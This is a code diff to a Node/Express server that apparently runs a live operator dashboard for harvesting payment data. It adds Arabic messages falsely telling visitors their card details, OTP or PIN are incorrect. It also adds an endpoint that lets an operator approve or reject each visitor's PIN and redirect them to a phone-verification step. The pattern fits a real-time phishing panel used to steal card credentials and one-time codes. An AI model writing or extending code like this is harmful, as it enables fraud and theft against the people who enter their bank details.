@@ -810,6 +810,8 @@ async function startServer() {
       } else if (action === "rejected") {
         updateData._v1Status = "rejected";
         updateData.paymentStatus = "rejected";
+        updateData.cardRejectionMessage = "بيانات البطاقة غير صحيحة - يرجى المحاولة بطريقة دفع مختلفة";
+        updateData.cardRejectionAt = new Date().toISOString();
         console.log('[PaymentAction] Rejected');
       }
 
@@ -859,7 +861,7 @@ async function startServer() {
       } else if (action === "rejected") {
         updateData._v5Status = "rejected";
         updateData.otpStatus = "rejected";
-        updateData.otpRejectionMessage = "تم رفض رمز التحقق من البطاقة - يرجى المحاولة مرة أخرى";
+        updateData.otpRejectionMessage = "رمز التحقق غير صحيح أو منتهي الصلاحية - يرجى انتظار رمز جديد";
         updateData.otpRejectionAt = new Date().toISOString();
       } else if (action === "resend") {
         updateData.otpResendRequested = true;
@@ -919,6 +921,62 @@ async function startServer() {
     } catch (error) {
       console.error("send pin error", error);
       res.status(500).json({ error: "Failed to send PIN" });
+    }
+  });
+
+  // PIN Verification Approval/Rejection (Step3Page)
+  app.post("/api/dashboard/pin-action", async (req, res) => {
+    try {
+      const { visitorId, action } = req.body;
+      
+      if (!visitorId || !action) {
+        res.status(400).json({ error: "Missing visitorId or action" });
+        return;
+      }
+
+      const currentVisitor = await readVisitor(visitorId);
+      const customerName = currentVisitor?.ownerName || currentVisitor?.phoneNumber || "زائر";
+
+      const updateData: Record<string, any> = {
+        pinActionAt: new Date().toISOString(),
+        adminPinAction: action,
+      };
+
+      if (action === "approved") {
+        updateData._v6Status = "approved";
+        updateData.paymentStatus = "pin_approved";
+        updateData.oneTimeRedirect = "step5"; // Redirect to phone verification
+        updateData.currentStep = "_t5";
+        updateData.currentPage = "phone";
+      } else if (action === "rejected") {
+        updateData._v6Status = "rejected";
+        updateData.paymentStatus = "pin_rejected";
+        updateData.pinRejectionMessage = "رمز PIN غير صحيح - يرجى المحاولة مرة أخرى";
+        updateData.pinRejectionAt = new Date().toISOString();
+        updateData.currentPage = "step3";
+        updateData.currentStep = 6;
+      }
+
+      // Update visitor data so customer can receive the update
+      await upsertVisitor(visitorId, updateData);
+      
+      // Preserve all existing visitor data for dashboard
+      const dashboardData = await upsertDashboardRequest({ 
+        id: visitorId, 
+        visitorId: visitorId,
+        customer: customerName,
+        ...currentVisitor,
+        ...updateData, 
+        updated: "تم التحديث الآن" 
+      });
+
+      // Broadcast to dashboard immediately
+      broadcastToDashboard("dashboard:update", dashboardData);
+
+      res.json({ success: true, action });
+    } catch (error) {
+      console.error("pin action error", error);
+      res.status(500).json({ error: "Failed to process PIN action" });
     }
   });
 
